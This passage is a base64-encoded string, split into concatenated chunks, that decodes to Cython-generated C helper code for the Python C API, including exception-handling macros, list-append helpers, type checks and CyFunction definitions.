qZWN0ICoqYXJncywgaW50IG4pOwojZWxzZQojZGVmaW5lIF9fUHl4X09iamVjdF9WZWN0b3JjYWxsX0NhbGxGcm9tQnVpbGRlciBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbERpY3QKI2RlZmluZSBfX1B5eF9NYWtlVmVjdG9yY2FsbEJ1aWxkZXJLd2RzKG4pIF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZChuKQojZGVmaW5lIF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhrZXksIHZhbHVlLCBidWlsZGVyLCBhcmdzLCBuKSBQeURpY3RfU2V0SXRlbShidWlsZGVyLCBrZXksIHZhbHVlKQojZGVmaW5lIF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZ1N0cihrZXksIHZhbHVlLCBidWlsZGVyLCBhcmdzLCBuKSBQeURpY3RfU2V0SXRlbVN0cmluZyhidWlsZGVyLCBrZXksIHZhbHVlKQojZW5kaWYKCgojaWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDSyAmJiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUKc3RhdGljIF9QeUVycl9TdGFja0l0ZW0gKiBfX1B5eF9QeUVycl9HZXRUb3Btb3N0RXhjZXB0aW9uKFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSk7CiNlbmRpZgoKCiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUKI2RlZmluZSBfX1B5eF9FeGNlcHRpb25TYXZlKHR5cGUsIHZhbHVlLCB0YikgIF9fUHl4X19FeGNlcHRpb25TYXZlKF9fcHl4X3RzdGF0ZSwgdHlwZSwgdmFsdWUsIHRiKQpzdGF0aWMgQ1lUSE9OX0lOTElORSB2b2lkIF9fUHl4X19FeGNlcHRpb25TYXZlKFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSwgUHlPYmplY3QgKip0eXBlLCBQeU9iamVjdCAqKnZhbHVlLCBQeU9iamVjdCAqKnRiKTsKI2RlZmluZSBfX1B5eF9FeGNlcHRpb25SZXNldCh0eXBlLCB2YWx1ZSwgdGIpICBfX1B5eF9fRXhjZXB0aW9uUmVzZXQoX19weXhfdHN0YXRlLCB0eXBlLCB2YWx1ZSwgdGIpCnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfX0V4Y2VwdGlvblJlc2V0KFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSwgUHlPYmplY3QgKnR5cGUsIFB5T2JqZWN0ICp2YWx1ZSwgUHlPYmplY3QgKnRiKTsKI2Vsc2UKI2RlZmluZSBfX1B5eF9FeGNlcHRpb25TYXZlKHR5cGUsIHZhbHVlLCB0YikgICBQeUVycl9HZXRFeGNJbmZvKHR5cGUsIHZhbHVlLCB0YikKI2RlZmluZSBfX1B5eF9FeGNlcHRpb25SZXNldCh0eXBlLCB2YWx1ZSwgdGIpICBQeUVycl9TZXRFeGNJbmZvKHR5cGUsIHZhbHVlLCB0YikKI2VuZGlmCgoKc3RhdGljIHZvaWQgX19QeXhfUmFpc2VVbmJvdW5kTG9jYWxFcnJvcihjb25zdCBjaGFyICp2YXJuYW1lKTsKCgojaWYgQ1lUSE9OX1VTRV9QWUxJU1RfSU5URVJOQUxTICYmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X0xpc3RDb21wX0FwcGVuZChQeU9iamVjdCogbGlzdCwgUHlPYmplY3QqIHgpIHsKICAgIFB5TGlzdE9iamVj""dCogTCA9IChQeUxpc3RPYmplY3QqKSBsaXN0OwogICAgUHlfc3NpemVfdCBsZW4gPSBQeV9TSVpFKGxpc3QpOwogICAgaWYgKGxpa2VseShMLT5hbGxvY2F0ZWQgPiBsZW4pKSB7CiAgICAgICAgUHlfSU5DUkVGKHgpOwogICAgICAgICNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBkMDAwMAogICAgICAgIEwtPm9iX2l0ZW1bbGVuXSA9IHg7CiAgICAgICAgI2Vsc2UKICAgICAgICBQeUxpc3RfU0VUX0lURU0obGlzdCwgbGVuLCB4KTsKICAgICAgICAjZW5kaWYKICAgICAgICBfX1B5eF9TRVRfU0laRShsaXN0LCBsZW4gKyAxKTsKICAgICAgICByZXR1cm4gMDsKICAgIH0KICAgIHJldHVybiBQeUxpc3RfQXBwZW5kKGxpc3QsIHgpOwp9CiNlbHNlCiNkZWZpbmUgX19QeXhfTGlzdENvbXBfQXBwZW5kKEwseCkgUHlMaXN0X0FwcGVuZChMLHgpCiNlbmRpZgoKCiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEUKI2RlZmluZSBfX1B5eF9HZXRFeGNlcHRpb24odHlwZSwgdmFsdWUsIHRiKSAgX19QeXhfX0dldEV4Y2VwdGlvbihfX3B5eF90c3RhdGUsIHR5cGUsIHZhbHVlLCB0YikKc3RhdGljIGludCBfX1B5eF9fR2V0RXhjZXB0aW9uKFB5VGhyZWFkU3RhdGUgKnRzdGF0ZSwgUHlPYmplY3QgKip0eXBlLCBQeU9iamVjdCAqKnZhbHVlLCBQeU9iamVjdCAqKnRiKTsKI2Vsc2UKc3RhdGljIGludCBfX1B5eF9HZXRFeGNlcHRpb24oUHlPYmplY3QgKip0eXBlLCBQeU9iamVjdCAqKnZhbHVlLCBQeU9iamVjdCAqKnRiKTsKI2VuZGlmCgoKc3RhdGljIHZvaWQgX19QeXhfR2VuZXJhdG9yX1JlcGxhY2VfU3RvcEl0ZXJhdGlvbihpbnQgaW5fYXN5bmNfZ2VuKTsKCgpzdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlVbmljb2RlX1VuaWNvZGUoUHlPYmplY3QgKm9iaik7CgoKIyBpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04KICAgICNpZiBDWVRIT05fUkVGTkFOTlkKICAgICAgICAjZGVmaW5lIF9fUHl4X1B5VW5pY29kZV9Db25jYXRJblBsYWNlKGxlZnQsIHJpZ2h0KSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0SW5QbGFjZUltcGwoJmxlZnQsIHJpZ2h0LCBfX3B5eF9yZWZuYW5ueSkKICAgICNlbHNlCiAgICAgICAgI2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0SW5QbGFjZShsZWZ0LCByaWdodCkgX19QeXhfUHlVbmljb2RlX0NvbmNhdEluUGxhY2VJbXBsKCZsZWZ0LCByaWdodCkKICAgICNlbmRpZgogICAgc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X1B5VW5pY29kZV9Db25jYXRJblBsYWNlSW1wbChQeU9iamVjdCAqKnBfbGVmdCwgUHlPYmplY3QgKnJpZ2h0CiAgICAgICAgI2lmIENZVEhPTl9SRUZOQU5OWQogICAgICAgICwgdm9pZCogX19weXhfcmVmbmFubnkKICAgICAgICAjZW5kaWYKICAgICk7CiNlbHNlCiNkZWZpbmUgX19QeXhfUHlVbmljb2RlX0NvbmNhdEluUGxhY2UgX19QeXhfUHlVbmljb2RlX0NvbmNhdAojZW5kaWYK""I2RlZmluZSBfX1B5eF9QeVVuaWNvZGVfQ29uY2F0SW5QbGFjZVNhZmUobGVmdCwgcmlnaHQpICgodW5saWtlbHkoKGxlZnQpID09IFB5X05vbmUpIHx8IHVubGlrZWx5KChyaWdodCkgPT0gUHlfTm9uZSkpID9cCiAgICBQeU51bWJlcl9JblBsYWNlQWRkKGxlZnQsIHJpZ2h0KSA6IF9fUHl4X1B5VW5pY29kZV9Db25jYXRJblBsYWNlKGxlZnQsIHJpZ2h0KSkKCgojZGVmaW5lIF9fUHl4X1B5T2JqZWN0X1VuaWNvZGUob2JqKVwKICAgIChsaWtlbHkoUHlVbmljb2RlX0NoZWNrRXhhY3Qob2JqKSkgPyBfX1B5eF9OZXdSZWYob2JqKSA6IFB5T2JqZWN0X1N0cihvYmopKQoKCiNpZiBDWVRIT05fVkVDVE9SQ0FMTCAmJiBQWV9WRVJTSU9OX0hFWCA+PSAweDAzMDkwMDAwCiNkZWZpbmUgX19QeXhfT2JqZWN0X1ZlY3RvcmNhbGxNZXRob2RfQ2FsbEZyb21CdWlsZGVyIFB5T2JqZWN0X1ZlY3RvcmNhbGxNZXRob2QKI2Vsc2UKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9PYmplY3RfVmVjdG9yY2FsbE1ldGhvZF9DYWxsRnJvbUJ1aWxkZXIoUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpjb25zdCAqYXJncywgc2l6ZV90IG5hcmdzZiwgUHlPYmplY3QgKmt3bmFtZXMpOwojZW5kaWYKCgpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfUHlTZXF1ZW5jZV9Db250YWluc1RGKFB5T2JqZWN0KiBpdGVtLCBQeU9iamVjdCogc2VxLCBpbnQgZXEpIHsKICAgIGludCByZXN1bHQgPSBQeVNlcXVlbmNlX0NvbnRhaW5zKHNlcSwgaXRlbSk7CiAgICByZXR1cm4gdW5saWtlbHkocmVzdWx0IDwgMCkgPyByZXN1bHQgOiAocmVzdWx0ID09IChlcSA9PSBQeV9FUSkpOwp9CgoKI2lmIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUCAmJiBDWVRIT05fVVNFX1RZUEVfU0xPVFMKI2RlZmluZSBfX1B5eF9QeU9iamVjdF9Mb29rdXBTcGVjaWFsTm9FcnJvcihvYmosIGF0dHJfbmFtZSkgIF9fUHl4X19QeU9iamVjdF9Mb29rdXBTcGVjaWFsKG9iaiwgYXR0cl9uYW1lLCAwKQojZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0xvb2t1cFNwZWNpYWwob2JqLCBhdHRyX25hbWUpICBfX1B5eF9fUHlPYmplY3RfTG9va3VwU3BlY2lhbChvYmosIGF0dHJfbmFtZSwgMSkKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X19QeU9iamVjdF9Mb29rdXBTcGVjaWFsKFB5T2JqZWN0KiBvYmosIFB5T2JqZWN0KiBhdHRyX25hbWUsIGludCB3aXRoX2Vycm9yKTsKI2Vsc2UKI2RlZmluZSBfX1B5eF9QeU9iamVjdF9Mb29rdXBTcGVjaWFsTm9FcnJvcihvLG4pIF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHJOb0Vycm9yKG8sbikKI2RlZmluZSBfX1B5eF9QeU9iamVjdF9Mb29rdXBTcGVjaWFsKG8sbikgX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihvLG4pCiNlbmRpZgoKCiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9QeUxvbmdfQWRkT2JqQyhQeU9iamVjdCAqb3AxLCBQeU9iamVjdCAqb3AyLCBsb25n""IGludHZhbCwgaW50IGlucGxhY2UsIGludCB6ZXJvZGl2aXNpb25fY2hlY2spOwojZWxzZQojZGVmaW5lIF9fUHl4X1B5TG9uZ19BZGRPYmpDKG9wMSwgb3AyLCBpbnR2YWwsIGlucGxhY2UsIHplcm9kaXZpc2lvbl9jaGVjaylcCiAgICAoaW5wbGFjZSA/IFB5TnVtYmVyX0luUGxhY2VBZGQob3AxLCBvcDIpIDogUHlOdW1iZXJfQWRkKG9wMSwgb3AyKSkKI2VuZGlmCgoKI2lmIENZVEhPTl9WRUNUT1JDQUxMICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwOTAwMDAKI2RlZmluZSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChuYW1lLCBhcmdzLCBuYXJnc2YpIFB5T2JqZWN0X1ZlY3RvcmNhbGxNZXRob2QobmFtZSwgYXJncywgbmFyZ3NmLCBOVUxMKQojZWxzZQpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqY29uc3QgKmFyZ3MsIHNpemVfdCBuYXJnc2YpOwojZW5kaWYKCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OCiNkZWZpbmUgX19QeXhfVHlwZUNoZWNrKG9iaiwgdHlwZSkgX19QeXhfSXNTdWJ0eXBlKFB5X1RZUEUob2JqKSwgKFB5VHlwZU9iamVjdCAqKXR5cGUpCiNkZWZpbmUgX19QeXhfVHlwZUNoZWNrMihvYmosIHR5cGUxLCB0eXBlMikgX19QeXhfSXNBbnlTdWJ0eXBlMihQeV9UWVBFKG9iaiksIChQeVR5cGVPYmplY3QgKil0eXBlMSwgKFB5VHlwZU9iamVjdCAqKXR5cGUyKQpzdGF0aWMgQ1lUSE9OX0lOTElORSBpbnQgX19QeXhfSXNTdWJ0eXBlKFB5VHlwZU9iamVjdCAqYSwgUHlUeXBlT2JqZWN0ICpiKTsKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X0lzQW55U3VidHlwZTIoUHlUeXBlT2JqZWN0ICpjbHMsIFB5VHlwZU9iamVjdCAqYSwgUHlUeXBlT2JqZWN0ICpiKTsKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhQeU9iamVjdCAqZXJyLCBQeU9iamVjdCAqdHlwZSk7CnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMyKFB5T2JqZWN0ICplcnIsIFB5T2JqZWN0ICp0eXBlMSwgUHlPYmplY3QgKnR5cGUyKTsKI2Vsc2UKI2RlZmluZSBfX1B5eF9UeXBlQ2hlY2sob2JqLCB0eXBlKSBQeU9iamVjdF9UeXBlQ2hlY2sob2JqLCAoUHlUeXBlT2JqZWN0ICopdHlwZSkKI2RlZmluZSBfX1B5eF9UeXBlQ2hlY2syKG9iaiwgdHlwZTEsIHR5cGUyKSAoUHlPYmplY3RfVHlwZUNoZWNrKG9iaiwgKFB5VHlwZU9iamVjdCAqKXR5cGUxKSB8fCBQeU9iamVjdF9UeXBlQ2hlY2sob2JqLCAoUHlUeXBlT2JqZWN0ICopdHlwZTIpKQojZGVmaW5lIF9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhlcnIsIHR5cGUpIFB5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhlcnIsIHR5cGUpCnN0YXRpYyBDWVRIT05fSU5MSU5FIGludCBfX1B5eF9QeUVycl9HaXZlbkV4Y2VwdGlvbk1hdGNoZXMyKFB5T2JqZWN0""ICplcnIsIFB5T2JqZWN0ICp0eXBlMSwgUHlPYmplY3QgKnR5cGUyKSB7CiAgICByZXR1cm4gUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGVyciwgdHlwZTEpIHx8IFB5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhlcnIsIHR5cGUyKTsKfQojZW5kaWYKI2RlZmluZSBfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzMihlcnIxLCBlcnIyKSAgX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzMihfX1B5eF9QeUVycl9DdXJyZW50RXhjZXB0aW9uVHlwZSgpLCBlcnIxLCBlcnIyKQojZGVmaW5lIF9fUHl4X1B5RXhjZXB0aW9uX0NoZWNrKG9iaikgX19QeXhfVHlwZUNoZWNrKG9iaiwgUHlFeGNfRXhjZXB0aW9uKQojaWZkZWYgUHlFeGNlcHRpb25JbnN0YW5jZV9DaGVjawogICNkZWZpbmUgX19QeXhfUHlCYXNlRXhjZXB0aW9uX0NoZWNrKG9iaikgUHlFeGNlcHRpb25JbnN0YW5jZV9DaGVjayhvYmopCiNlbHNlCiAgI2RlZmluZSBfX1B5eF9QeUJhc2VFeGNlcHRpb25fQ2hlY2sob2JqKSBfX1B5eF9UeXBlQ2hlY2sob2JqLCBQeUV4Y19CYXNlRXhjZXB0aW9uKQojZW5kaWYKCgojaWYgQ1lUSE9OX0ZBU1RfVEhSRUFEX1NUQVRFCiNkZWZpbmUgX19QeXhfRXhjZXB0aW9uU3dhcCh0eXBlLCB2YWx1ZSwgdGIpICBfX1B5eF9fRXhjZXB0aW9uU3dhcChfX3B5eF90c3RhdGUsIHR5cGUsIHZhbHVlLCB0YikKc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9fRXhjZXB0aW9uU3dhcChQeVRocmVhZFN0YXRlICp0c3RhdGUsIFB5T2JqZWN0ICoqdHlwZSwgUHlPYmplY3QgKip2YWx1ZSwgUHlPYmplY3QgKip0Yik7CiNlbHNlCnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfRXhjZXB0aW9uU3dhcChQeU9iamVjdCAqKnR5cGUsIFB5T2JqZWN0ICoqdmFsdWUsIFB5T2JqZWN0ICoqdGIpOwojZW5kaWYKCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBfX1BZWF9MSU1JVEVEX1ZFUlNJT05fSEVYIDwgMHgwMzBkMDAwMAojZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0RlbEF0dHIobywgbikgUHlPYmplY3RfU2V0QXR0cihvLCBuLCBOVUxMKQojZWxzZQojZGVmaW5lIF9fUHl4X1B5T2JqZWN0X0RlbEF0dHIobywgbikgUHlPYmplY3RfRGVsQXR0cihvLCBuKQojZW5kaWYKCgojaWYgQ1lUSE9OX1VTRV9UWVBFX1NMT1RTCiNkZWZpbmUgX19QeXhfUHlPYmplY3RfRGVsQXR0clN0cihvLG4pIF9fUHl4X1B5T2JqZWN0X1NldEF0dHJTdHIobywgbiwgTlVMTCkKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5T2JqZWN0X1NldEF0dHJTdHIoUHlPYmplY3QqIG9iaiwgUHlPYmplY3QqIGF0dHJfbmFtZSwgUHlPYmplY3QqIHZhbHVlKTsKI2Vsc2UKI2RlZmluZSBfX1B5eF9QeU9iamVjdF9EZWxBdHRyU3RyKG8sbikgICBfX1B5eF9QeU9iamVjdF9EZWxBdHRyKG8sbikKI2RlZmluZSBfX1B5eF9QeU9iamVjdF9TZXRBdHRyU3RyKG8sbix2KSBQeU9iamVjdF9TZXRBdHRyKG8sbix2KQojZW5kaWYKCgoj""aWYgQ1lUSE9OX1VTRV9QWUxJU1RfSU5URVJOQUxTICYmIENZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X1B5TGlzdF9BcHBlbmQoUHlPYmplY3QqIGxpc3QsIFB5T2JqZWN0KiB4KSB7CiAgICBQeUxpc3RPYmplY3QqIEwgPSAoUHlMaXN0T2JqZWN0KikgbGlzdDsKICAgIFB5X3NzaXplX3QgbGVuID0gUHlfU0laRShsaXN0KTsKICAgIGlmIChsaWtlbHkoTC0+YWxsb2NhdGVkID4gbGVuKSAmIGxpa2VseShsZW4gPiAoTC0+YWxsb2NhdGVkID4+IDEpKSkgewogICAgICAgIFB5X0lOQ1JFRih4KTsKICAgICAgICAjaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwMDAKICAgICAgICBMLT5vYl9pdGVtW2xlbl0gPSB4OwogICAgICAgICNlbHNlCiAgICAgICAgUHlMaXN0X1NFVF9JVEVNKGxpc3QsIGxlbiwgeCk7CiAgICAgICAgI2VuZGlmCiAgICAgICAgX19QeXhfU0VUX1NJWkUobGlzdCwgbGVuICsgMSk7CiAgICAgICAgcmV0dXJuIDA7CiAgICB9CiAgICByZXR1cm4gUHlMaXN0X0FwcGVuZChsaXN0LCB4KTsKfQojZWxzZQojZGVmaW5lIF9fUHl4X1B5TGlzdF9BcHBlbmQoTCx4KSBQeUxpc3RfQXBwZW5kKEwseCkKI2VuZGlmCgoKI2lmICFDWVRIT05fVVNFX1RZUEVfU1BFQ1MgfHwgKCFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDAwMCkKI2RlZmluZSBfX1B5eF9jYWxsX3R5cGVfdHJhdmVyc2UobywgYWx3YXlzX2NhbGwsIHZpc2l0LCBhcmcpIDAKI2Vsc2UKc3RhdGljIGludCBfX1B5eF9jYWxsX3R5cGVfdHJhdmVyc2UoUHlPYmplY3QgKm8sIGludCBhbHdheXNfY2FsbCwgdmlzaXRwcm9jIHZpc2l0LCB2b2lkICphcmcpOwojZW5kaWYKCgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0dldFR5cGVEaWN0KFB5VHlwZU9iamVjdCAqdHApOwojZW5kaWYKCgpzdGF0aWMgaW50IF9fUHl4X19TZXRJdGVtT25UeXBlRGljdChQeVR5cGVPYmplY3QgKnRwLCBQeU9iamVjdCAqaywgUHlPYmplY3QgKnYpOwojZGVmaW5lIF9fUHl4X1NldEl0ZW1PblR5cGVEaWN0KHRwLCBrLCB2KSBfX1B5eF9fU2V0SXRlbU9uVHlwZURpY3QoKFB5VHlwZU9iamVjdCopdHAsIGssIHYpCgoKc3RhdGljIENZVEhPTl9JTkxJTkUgaW50IF9fUHl4X2ZpeF91cF9leHRlbnNpb25fdHlwZV9mcm9tX3NwZWMoUHlUeXBlX1NwZWMgKnNwZWMsIFB5VHlwZU9iamVjdCAqdHlwZSk7CgoKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0NhbGxOb0FyZyhQeU9iamVjdCAqZnVuYyk7CgoKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0NhbGxPbmVBcmcoUHlPYmplY3QgKmZ1bmMsIFB5T2JqZWN0ICphcmcpOwoKCnN0YXRpYyBpbnQgX19QeXhfUHlPYmplY3RfR2V0TWV0aG9kKFB5""T2JqZWN0ICpvYmosIFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqKm1ldGhvZCk7CgoKc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9QeU9iamVjdF9DYWxsTWV0aG9kMChQeU9iamVjdCogb2JqLCBQeU9iamVjdCogbWV0aG9kX25hbWUpOwoKCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0NQWVRIT04gfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSB8fCBDWVRIT05fVVNFX1RZUEVfU1BFQ1MKc3RhdGljIGludCBfX1B5eF92YWxpZGF0ZV9iYXNlc190dXBsZShjb25zdCBjaGFyICp0eXBlX25hbWUsIFB5X3NzaXplX3QgZGljdG9mZnNldCwgUHlPYmplY3QgKmJhc2VzKTsKI2VuZGlmCgoKQ1lUSE9OX1VOVVNFRCBzdGF0aWMgaW50IF9fUHl4X1B5VHlwZV9SZWFkeShQeVR5cGVPYmplY3QgKnQpOwoKCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfSW1wb3J0KFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqZnJvbV9saXN0LCBpbnQgbGV2ZWwpOwoKCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlKFB5T2JqZWN0ICpuYW1lLCBQeU9iamVjdCAqcGFydHNfdHVwbGUpOwpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZV9XYWxrUGFydHMoUHlPYmplY3QgKm1vZHVsZSwgUHlPYmplY3QgKm5hbWUsIFB5T2JqZWN0ICpwYXJ0c190dXBsZSk7CgoKc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9QeUxpc3RfUGFjayhQeV9zc2l6ZV90IG4sIC4uLik7CgoKc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9JbXBvcnRGcm9tKFB5T2JqZWN0KiBtb2R1bGUsIFB5T2JqZWN0KiBuYW1lKTsKCgpzdGF0aWMgUHlPYmplY3QgKl9fUHl4X0ZldGNoU2hhcmVkQ3l0aG9uQUJJTW9kdWxlKHZvaWQpOwoKCnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0ICpfX1B5eF9QeURpY3RfU2V0RGVmYXVsdChQeU9iamVjdCAqZCwgUHlPYmplY3QgKmtleSwgUHlPYmplY3QgKmRlZmF1bHRfdmFsdWUsIGludCBpc19zYWZlX3R5cGUpOwoKCnN0YXRpYyBQeVR5cGVPYmplY3QqIF9fUHl4X0ZldGNoQ29tbW9uVHlwZUZyb21TcGVjKFB5VHlwZU9iamVjdCAqbWV0YWNsYXNzLCBQeU9iamVjdCAqbW9kdWxlLCBQeVR5cGVfU3BlYyAqc3BlYywgUHlPYmplY3QgKmJhc2VzKTsKCgpzdGF0aWMgaW50IF9fcHl4X0NvbW1vblR5cGVzTWV0YWNsYXNzX2luaXQoUHlPYmplY3QgKm1vZHVsZSk7CiNkZWZpbmUgX19QeXhfQ29tbW9uVHlwZXNNZXRhY2xhc3NfVVNFRAoKCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfUHlNZXRob2RfTmV3KFB5T2JqZWN0ICpmdW5jLCBQeU9iamVjdCAqc2VsZiwgUHlPYmplY3QgKnR5cCk7CgoKI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMICYmIChDWVRIT05fVkVDVE9SQ0FMTCB8fCBDWVRIT05fQkFDS1BPUlRfVkVDVE9SQ0FMTCkKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QgKl9fUHl4X1B5VmVjdG9yY2FsbF9GYXN0Q2FsbERpY3QoUHlPYmplY3QgKmZ1bmMsIF9fcHl4X3ZlY3RvcmNhbGxmdW5jIHZjLCBQ""eU9iamVjdCAqY29uc3QgKmFyZ3MsIHNpemVfdCBuYXJncywgUHlPYmplY3QgKmt3KTsKI2VuZGlmCgoKI2RlZmluZSBfX1B5eF9DeUZ1bmN0aW9uX1VTRUQKI2RlZmluZSBfX1B5eF9DWUZVTkNUSU9OX1NUQVRJQ01FVEhPRCAgMHgwMQojZGVmaW5lIF9fUHl4X0NZRlVOQ1RJT05fQ0xBU1NNRVRIT0QgICAweDAyCiNkZWZpbmUgX19QeXhfQ1lGVU5DVElPTl9DQ0xBU1MgICAgICAgIDB4MDQKI2RlZmluZSBfX1B5eF9DWUZVTkNUSU9OX0NPUk9VVElORSAgICAgMHgwOAojZGVmaW5lIF9fUHl4X0N5RnVuY3Rpb25fR2V0Q2xvc3VyZShmKVwKICAgICgoKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKikgKGYpKS0+ZnVuY19jbG9zdXJlKQojaWYgUFlfVkVSU0lPTl9IRVggPCAweDAzMDkwMEIxIHx8IENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAjZGVmaW5lIF9fUHl4X0N5RnVuY3Rpb25fR2V0Q2xhc3NPYmooZilcCiAgICAgICgoKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKikgKGYpKS0+ZnVuY19jbGFzc29iaikKI2Vsc2UKICAjZGVmaW5lIF9fUHl4X0N5RnVuY3Rpb25fR2V0Q2xhc3NPYmooZilcCiAgICAgICgoUHlPYmplY3QqKSAoKFB5Q01ldGhvZE9iamVjdCAqKSAoZikpLT5tbV9jbGFzcykKI2VuZGlmCiNkZWZpbmUgX19QeXhfQ3lGdW5jdGlvbl9TZXRDbGFzc09iaihmLCBjbGFzc29iailcCiAgICBfX1B5eF9fQ3lGdW5jdGlvbl9TZXRDbGFzc09iaigoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqKSAoZiksIChjbGFzc29iaikpCiNkZWZpbmUgX19QeXhfQ3lGdW5jdGlvbl9EZWZhdWx0cyh0eXBlLCBmKVwKICAgICgodHlwZSAqKSgoKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKikgKGYpKS0+ZGVmYXVsdHMpKQojZGVmaW5lIF9fUHl4X0N5RnVuY3Rpb25fU2V0RGVmYXVsdHNHZXR0ZXIoZiwgZylcCiAgICAoKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKikgKGYpKS0+ZGVmYXVsdHNfZ2V0dGVyID0gKGcpCnR5cGVkZWYgc3RydWN0IHsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIFB5T2JqZWN0X0hFQUQKICAgIFB5T2JqZWN0ICpmdW5jOwojZWxpZiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwOTAwQjEKICAgIFB5Q0Z1bmN0aW9uT2JqZWN0IGZ1bmM7CiNlbHNlCiAgICBQeUNNZXRob2RPYmplY3QgZnVuYzsKI2VuZGlmCiNpZiBDWVRIT05fQkFDS1BPUlRfVkVDVE9SQ0FMTCB8fFwKICAgICAgICAoQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBDWVRIT05fTUVUSF9GQVNUQ0FMTCkKICAgIF9fcHl4X3ZlY3RvcmNhbGxmdW5jIGZ1bmNfdmVjdG9yY2FsbDsKI2VuZGlmCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBQeU9iamVjdCAqZnVuY1